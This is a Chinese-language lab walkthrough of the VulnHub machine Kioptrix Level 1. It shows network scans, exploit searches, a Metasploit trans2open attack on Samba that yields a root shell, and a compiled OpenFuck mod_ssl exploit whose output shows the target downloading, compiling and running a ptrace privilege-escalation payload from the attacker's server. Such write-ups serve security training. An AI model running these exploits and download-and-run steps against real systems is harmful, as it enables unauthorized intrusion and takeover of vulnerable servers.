---
title: Kioptix Level 1
publish_date: 2024-10-11
---

# 搭建

靶机下载地址：https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

靶机网络模式默认为桥接模式，需要改配置文件，如下

![image](https://github.com/user-attachments/assets/65642eed-efdf-4cac-824d-8e077f514b03)


改完后在vmware里面将网络模式也改为NAT模式

然后开机

![image](https://github.com/user-attachments/assets/1b1bc266-53e7-48c7-a545-e5c31f8b3ded)


# 网络探测

## IP

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sP 192.168.85.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 11:03 EDT
Nmap scan report for 192.168.85.1
Host is up (0.00013s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.85.2
Host is up (0.000091s latency).
MAC Address: 00:50:56:F8:7C:EB (VMware)
Nmap scan report for 192.168.85.156
Host is up (0.00064s latency).
MAC Address: 00:0C:29:F0:CB:D8 (VMware)
Nmap scan report for 192.168.85.254
Host is up (0.00011s latency).
MAC Address: 00:50:56:EA:8F:24 (VMware)
Nmap scan report for 192.168.85.154
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.95 seconds
```

本机kali ip192.168.85.154

得到靶机ip为192.168.85.156

## 端口探测

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -A 192.168.85.156 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 11:05 EDT
Nmap scan report for 192.168.85.156
Host is up (0.0012s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1026/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: 4WMYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2024-09-16T15:08:08+00:00; +1m50s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:F0:CB:D8 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 1m49s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   1.16 ms 192.168.85.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

### 开放端口与服务

1. **22/tcp - SSH**
    - 该端口运行的是 **OpenSSH 2.9p2**，支持 **SSHv1** 协议。这是一个非常老旧且不安全的协议版本，容易受到攻击，建议使用SSHv2替代。
    - 该服务器支持多种SSH主机密钥（RSA1、DSA、RSA），其中RSA1属于SSHv1。
2. **80/tcp - HTTP (Apache 1.3.20)**
    - 使用的是非常老旧的 **Apache 1.3.20** 版本，并且运行在 **Red Hat Linux** 系统上，包含 **mod_ssl/2.8.4** 和 **OpenSSL/0.9.6b**，这些版本中有已知的漏洞，例如 **SSLv2** 支持。
    - HTTP服务暴露了 **TRACE** 方法，这是一种潜在的风险，因为它可能会被用作跨站追踪攻击的向量。
    - 网站标题显示为 "Test Page for the Apache Web Server on Red Hat Linux"，表明这个服务可能还没有被配置为生产环境。
3. **111/tcp - RPCbind**
    - 该端口提供的是远程过程调用服务，显示的是 **RPC 2** 版本。该服务通常用于管理分布式服务，但它也是攻击者尝试探测和利用的目标。
    - 另一个相关的服务在端口 **1024/tcp** 上运行，显示为状态监控程序。
4. **139/tcp - NetBIOS (Samba)**
    - 这是用于文件和打印共享的 **Samba** 服务，属于Windows网络中的NetBIOS协议。它可能会暴露敏感的文件共享和用户信息，尤其是当配置不当时。
5. **443/tcp - SSL/HTTPS (Apache 1.3.20)**
    - 该端口使用的是 **SSLv2**，这是一个过时且不安全的SSL协议版本，容易受到各种攻击（例如 **DROWN** 攻击）。此外，其证书已过期，证书有效期为 **2009-09-26** 到 **2010-09-26**。
    - 服务器仍在使用 **Apache 1.3.20**，这个版本已经停止维护多年，存在多个漏洞。
6. **1024/tcp - 状态 (RPC #100024)**
    - 这是另一个 **RPC** 服务的端口，用于状态监控。

### 操作系统和其他信息

- 该主机运行的是 **Linux 2.4.X** 内核，操作系统版本也较为陈旧，推测其为 **Linux 2.4.9 - 2.4.18** 版本。
- 该主机是一个虚拟机，使用的是 **VMware** 虚拟网卡。
- **时钟偏差** 约为1分钟，这可能会影响某些基于时间的攻击（如replay攻击）。
- **SMB2** 协议协商失败，说明该主机可能只支持 **SMB1** 协议，这也是一个已知的安全风险。

# 漏洞探测

## SMB

```bash
nmap --script=vuln -p 22,80,111,139,443,1024 192.168.85.156
```

探测到的可利用漏洞有一个smb

**SMBv2 协议漏洞 (CVE-2009-3103)**:

- 该漏洞允许远程攻击者通过特制的协议请求包在SMBv2中执行任意代码或导致拒绝服务攻击（系统崩溃）。

使用msf扫一下smb的版本然后再去找exp

```bash
msf6 > search smb version
............
msf6 > use 103
msf6 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/doc
                                       s/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.85.156
rhosts => 192.168.85.156
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.85.156:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.85.156:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.85.156:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

探测到版本为2.2.1a

找exp

使用searchsploit或者去https://www.exploit-db.com/进行查找

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit -s samba 2.2
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                              | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                           | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                      | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                        | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                    | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                      | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                              | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                             | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                             | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                             | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                             | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                   | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                   | linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                      | multiple/remote/10.c
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

试一下`Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)`

```bash
#搜索模块
msf6 exploit(freebsd/samba/trans2open) > search samba trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .

Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open                                                                                      
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                                                  

#选择指定模块
msf6 exploit(freebsd/samba/trans2open) > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
#查看配置参数
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs
                                      /using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.85.154   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

View the full module info with the info, or info -d command.

#设置目标ip
msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.85.156
rhosts => 192.168.85.156
#设置payload 这里注意一下，不清楚为什么默认的payload反弹shell回不来，
#如果说是正反向链接的原因的话我换为linux/x86/meterpreter/bind_tcp
#也没成功，没搞懂
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/meterpreter/bind_tcp
payload => linux/x86/meterpreter/bind_tcp
msf6 exploit(linux/samba/trans2open) > run

[*] Started bind TCP handler against 192.168.85.156:4444
[*] 192.168.85.156:139 - Trying return address 0xbffffdfc...
[*] 192.168.85.156:139 - Trying return address 0xbffffcfc...
[*] 192.168.85.156:139 - Trying return address 0xbffffbfc...
[*] 192.168.85.156:139 - Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 192.168.85.156
[*] 192.168.85.156:139 - Trying return address 0xbffff9fc...
[*] 192.168.85.156:139 - Trying return address 0xbffff8fc...
[*] 192.168.85.156:139 - Trying return address 0xbffff7fc...
[*] 192.168.85.156:139 - Trying return address 0xbffff6fc...
[*] 192.168.85.156:139 - Trying return address 0xbffff5fc...
[*] Command shell session 6 opened (192.168.85.154:38017 -> 192.168.85.156:4444) at 2024-09-16 12:44:21 -0400

id
uid=0(root) gid=0(root) groups=99(nobody)
```

拿到shell，并且为root权限

- **`uid=0(root)`**:
    - **UID** 是 "User Identifier" 的缩写，表示用户的唯一标识号。在类Unix操作系统中，UID 0 是超级用户（root）的标识。`uid=0(root)` 表示当前会话是以 root 用户身份运行的，root 是系统的最高权限用户，拥有完全的控制权。
- **`gid=0(root)`**:
    - **GID** 是 "Group Identifier" 的缩写，表示用户组的唯一标识号。GID 0 代表的是 root 用户组，通常只有 root 用户属于这个组。`gid=0(root)` 表示当前会话属于 root 用户组。
- **`groups=99(nobody)`**:
    - **groups** 显示的是用户所属的附加用户组。`99(nobody)` 表示该用户（即 root 用户）还被分配到了一个编号为 99 的用户组，通常称为 `nobody`。`nobody` 组在系统中一般用于处理没有明确用户的进程或任务。

## mod_ssl

在上面的端口开放情况和服务探测中扫描到了mod_ssl的具体版本为2.8.4

![image](https://github.com/user-attachments/assets/38dc483f-a277-4f81-9bcc-65c4cab21fc0)


搜索以下有啥洞没

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# searchsploit -s mod_ssl 2.8  
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow    | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer O | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer | unix/remote/764.c
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

发现好像都可以操作一下

第一个说是可以dos咱们这里就没这个必要了

刚开始不知道选哪个

参考网上大佬说法选数字大的代码新，用起来方便，不然编译的时候可能要其他依赖

那就选47080这个

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# searchsploit -m unix/remote/47080.c
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
 Verified: False
File Type: C source, ASCII text
Copied to: /home/kali/Desktop/47080.c
```

这里有一点需要注意下，靶机是不联网的，而我们的exp里面有个公网的资源需要下载，解决办法就是下在我们本地，开一个临时服务，然后给他把地址改了

![image](https://github.com/user-attachments/assets/b12f2dd8-debd-43cb-93d9-d893fa9cb67d)

![image](https://github.com/user-attachments/assets/0888d147-f7e9-410e-b894-8921b7773572)


```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
--2024-09-16 13:46:45--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
正在解析主机 dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
正在连接 dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：3921 (3.8K) [text/x-csrc]
正在保存至: “ptrace-kmod.c”

ptrace-kmod.c                                    100%[=======================================================================================================>]   3.83K  --.-KB/s  用时 0s      

2024-09-16 13:46:47 (141 MB/s) - 已保存 “ptrace-kmod.c” [3921/3921])
```


```bash
#编译
┌──(root㉿kali)-[/home/kali/Desktop]
└─# gcc -o OpenFuck 47080.c -lcrypto
...
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ls
47080.c  OpenFuck  ptrace-kmod.c  xc
                                                                                                                                                                                                 
#运行看一下
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ./OpenFuck                                     

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x03 - Cobalt Sun x (apache-1.3.26)
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
        0x05 - Conectiva 4 (apache-1.3.6)
        。。。。。。。。。。
```

```bash
#根据我们探测端口时的信息我们选择0x6b
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ./OpenFuck 0x6b 192.168.85.156 443 -c 50 

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; -kmod. 
--14:06:59--  http://192.168.85.154:9999/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.85.154:9999... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   3.74 MB/s

14:06:59 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

gcc: file path prefix `/usr/bin' never used
[-] Unable to attach: Operation not permitted
bash: [6523: 1] tcsetattr: Invalid argument
bash-2.05$ 
bash-2.05$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

这里按照这里exp来说应该是root权限，但是我得到的是一个低权限shell，而且后续再打已经打不进去了，初步怀疑是文件重复导致一系列命令执行失败，这个问题我的想法是进到靶机里面删除相应文件解决，但是为啥不是root目前以我的能力无法解决

# 总结

该靶机在web层面的利用没啥东西，主要是各种服务低版本的漏洞利用。
